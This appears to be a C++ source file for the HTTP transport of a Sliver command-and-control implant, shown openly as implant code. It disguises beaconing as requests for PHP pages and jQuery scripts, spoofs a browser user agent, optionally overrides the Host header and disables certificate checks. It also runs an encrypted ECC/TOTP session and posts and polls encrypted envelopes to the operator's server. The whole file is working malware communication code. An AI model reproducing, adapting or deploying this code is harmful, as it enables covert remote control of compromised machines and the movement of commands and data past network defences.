#include "Client.h"
#include "CryptoUtils.h"
#include "base64_utils.h"
#include "encoders.h"
#include <ctime>
#include <cpr/cpr.h>
#include "my_time.h"
#include "constants.h"
#include <numeric>
using namespace std::chrono_literals;

namespace transports {

	const string userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.1232.632 Safari/537.36";
	
	IClient::IClient() {

	}
#ifdef HTTP
	HttpClient::HttpClient( string base_URI, unsigned long long netTimeout,unsigned long long tlsTimeout,unsigned long long pollTimeout,string proxyHost, int proxyPort,string proxyUsername, string proxyPassword,string hostHeader) {
		this->base_URI = base_URI;
		session = make_unique<cpr::Session>();
		if (proxyHost != "" && proxyPort) {
			auto urlProxy = proxyHost + string{ ":" } + to_string(proxyPort);
			session->SetProxies(cpr::Proxies{ { "http",urlProxy } });
		}
		if (proxyUsername != "") {
			session->SetProxyAuth(cpr::ProxyAuthentication{ {"http",cpr::EncodedAuthentication{proxyUsername,proxyPassword}} });
		}
		session->SetConnectTimeout(cpr::ConnectTimeout{1000s });
		session->SetTimeout(cpr::Timeout{ 1000s });
		this->pollTimeout = pollTimeout;
		this->netTimeout = netTimeout;
		if (hostHeader != "") {
			session->SetHeader(cpr::Header{ {"User-Agent",userAgent},{"Host",hostHeader}});
		}
		this->hostHeader = hostHeader;
		this->timeDelta = std::chrono::system_clock::duration(0);
	}

	string HttpClient::StartSessionURL() {
		auto s = SessionURL();
		return s.replace(s.find(".php"), 4, ".html");
	}

	string HttpClient::SessionURL() {
#ifdef DEBUG
		std::vector<string>segments = {
			// 
			"upload",
			// 
			"actions",
			// 
		};
		std::vector<string>filenames = {
			// 
			"api",
			// 
			"samples",
			// 
		};
#else
		//std::vector<string>segments = {
		//	// {{range .HTTPC2ImplantConfig.SessionPaths}}
		//	"{{.}}",
		//	// {{end}}
		//};
		//std::vector<string>filenames = {
		//	// {{range .HTTPC2ImplantConfig.SessionFiles}}
		//	"{{.}}",
		//	// {{end}}
		//};
		std::vector<string>segments = {
			// 
			"upload",
			// 
			"actions",
			// 
		};
		std::vector<string>filenames = {
			// 
			"api",
			// 
			"samples",
			// 
		};
#endif
		auto elems = RandomPath(segments, filenames, "php");
		auto ret = std::accumulate(
			std::next(elems.begin()),
			elems.end(),
			elems[0],
			[](std::string a, std::string b) {
				return a + "/" + b;
			}
		);
		return this->base_URI + "/" + ret;
	}

	string HttpClient::PollURL() {
#ifdef DEBUG
		std::vector<string>segments = {
			// 
			"script",
			// 
			"javascripts",
			// 
			"javascript",
			// 
			"jscript",
			// 
			"js",
			// 
			"umd",
			// 
		};
		std::vector<string>filenames = {
			// 
			"jquery.min",
			// 
			"jquery",
			// 
		};

#else
		//std::vector<string>segments = {
		//	// {{range .HTTPC2ImplantConfig.PollPaths}}
		//	"{{.}}",
		//	// {{end}}
		//};
		//std::vector<string>filenames = {
		//	// {{range .HTTPC2ImplantConfig.PollFiles}}
		//	"{{.}}",
		//	// {{end}}
		//};
		std::vector<string>segments = {
			// 
			"script",
			// 
			"javascripts",
			// 
			"javascript",
			// 
			"jscript",
			// 
			"js",
			// 
			"umd",
			// 
		};
		std::vector<string>filenames = {
			// 
			"jquery.min",
			// 
			"jquery",
			// 
		};
#endif
		auto elems = RandomPath(segments, filenames, "php");
		auto ret = std::accumulate(
			std::next(elems.begin()),
			elems.end(),
			elems[0],
			[](std::string a, std::string b) {
				return a + "/" + b;
			}
		);
		return ret;
	}

	std::vector<string> HttpClient::RandomPath(std::vector<string>& segments, std::vector<string>& filenames, string extension) {
		std::vector<string> genSegments;
		if (0 < segments.size()){
			auto n = rand() % segments.size();
			for (int i = 0;i < n;i++) {
				auto s = segments[rand() % segments.size()];
				genSegments.push_back(s);
			}
		}
		auto filename = filenames[rand() % filenames.size()];
		filename.append(string{ "." } + extension);
		genSegments.push_back(filename);
		return genSegments;
	}
bool HttpClient::SessionInit(string& error) {
		auto key = crypto::RandomKey();
		auto server_pbk = crypto::GetServerECCPublicKey();
		auto keyPair = crypto::getKeyPair();
		this->context.SetKey(key);
		sliverpb::HTTPSessionInit pb_req;
		pb_req.set_key(key.c_str(), key.size());
		string serialized;
		pb_req.SerializeToString(&serialized);
		auto encrypted = crypto::ECCEncryptToServer(serialized);
			
		auto tp = encoders::GetRandomEncoder();
		unique_ptr<encoders::Encoder> encoder{ std::move(std::get<1>(tp)) };
		auto nonce = std::get<0>(tp);
		auto encoded = encoder->Encode(encrypted);

		auto now_utc = toUTC(std::chrono::system_clock::now());
		auto totp = crypto::GetTOTP(now_utc+this->timeDelta);		

		auto URI = this->StartSessionURL();

		session->SetVerifySsl(cpr::VerifySsl{ false });
		session->SetUrl(cpr::Url{ URI + string("?n=") + to_string(nonce) + string("&op=") + to_string(totp) });
		session->SetBody(cpr::Body{ encoded });
		cpr::Response resp = session->Post();
		if (resp.status_code == 0) {
			error = "[-] Unable to connect";
			return false;
		}
		if (resp.status_code != 200) {
			auto serverDateHeader = resp.header.find("Date")->second;
			auto tt = fromHTTPDate(serverDateHeader.c_str());
			auto time_point = toUTC(&tt);
			auto delta = now_utc - time_point;
			this->timeDelta = delta;
			return false;
		}
		session->SetCookies(resp.cookies);
		auto decoded = encoder->Decode(resp.text);

		auto plaintext = this->context.Decrypt(decoded);
		this->sessionID = plaintext;
		return true;
	}

bool HttpClient::WriteAndReceive(const sliverpb::Envelope& to_send, sliverpb::Envelope& recv,string& error) {
	string data;
	to_send.SerializeToString(&data);
	auto reqData = this->context.Encrypt(data);

	auto tp = encoders::GetRandomEncoder();
	unique_ptr<encoders::Encoder> encoder{ std::move(std::get<1>(tp)) };
	auto nonce = std::get<0>(tp);

	auto encoded = encoder->Encode(reqData);
	auto URI = this->SessionURL();
	this->pollMutex.lock();
	this->session->SetUrl(cpr::Url{ URI });
	this->session->SetParameters(cpr::Parameters{ {"d",to_string(nonce)} });
	this->session->SetBody(encoded);
	auto resp = this->session->Post();
	this->pollMutex.unlock();
	if (resp.status_code == 0) {
		error = "[-] Unable to connect";
		return false;
	}
	if (resp.status_code == 404) {
		error = "[-] http 404 response";
		return false;
	}
	if (resp.text.empty()) {
		return false;
	}
	auto decoded = encoder->Decode(resp.text);
	auto plain = this->context.Decrypt(decoded);
	return recv.ParseFromString(plain);
}
bool HttpClient::WriteEnvelope(sliverpb::Envelope& envelope,string& error) {
	string data;
	envelope.SerializeToString(&data);
	auto reqData = this->context.Encrypt(data);

	auto tp = encoders::GetRandomEncoder();
	unique_ptr<encoders::Encoder> encoder{ std::move(std::get<1>(tp)) };
	auto nonce = std::get<0>(tp);

	auto encoded = encoder->Encode(reqData);

	auto URI = this->SessionURL();

	this->pollMutex.lock();
	this->session->SetUrl(cpr::Url{ URI });
	this->session->SetParameters(cpr::Parameters{ {"d",to_string(nonce)} });
	this->session->SetBody(encoded);
	auto resp = this->session->Post();
	this->pollMutex.unlock();
	if (resp.status_code == 0) {
		error = "[-] Unable to connect";
		return false;
	}
	if (resp.status_code == 404) {
		error = "[-] http 404 response ";
		return false;
	}
	else {
		return true;
	}
}

bool HttpClient::WriteEnvelopeNoResp(sliverpb::Envelope& envelope, string& error) {
	if (envelope.type() == sliverpb::MsgPivotPeerEnvelopeNoResponse) {
		envelope.set_type(sliverpb::MsgPivotPeerEnvelope);
	}

	return this->WriteEnvelope(envelope, error);
}
unique_ptr<sliverpb::Envelope> HttpClient::ReadEnvelope(string& error) {
	if (this->closed) {
		return nullptr;
	}
	if (this->sessionID.compare("") == 0) {
		return nullptr;
	}

	auto URI = this->PollURL();

	auto tp = encoders::GetRandomEncoder();
	unique_ptr<encoders::Encoder> encoder{ std::move(std::get<1>(tp)) };
	auto nonce = std::get<0>(tp);
	this->pollMutex.lock();
	this->session->SetUrl(cpr::Url{ URI });
	this->session->SetParameters(cpr::Parameters{ {"d",to_string(nonce)} });
	auto resp = this->session->Get();
	this->pollMutex.unlock();
	if (resp.status_code == 0) {
		error = "[-] Unable to connect";
		return nullptr;
	}
	if (resp.status_code == 403 || resp.status_code == 204) {
		cout << "got "<< resp.status_code << " from for " << this->sessionID << endl;
		return nullptr;
	}
	else if(resp.status_code == 200){
		unique_ptr<encoders::Encoder> encoder = make_unique<encoders::Base64>();
		auto decoded = encoder->Decode(resp.text);
		auto plain = this->context.Decrypt(decoded);
		auto env = make_unique<sliverpb::Envelope>();
		env->ParseFromString(plain);
		return env;
	}
}
#endif
}

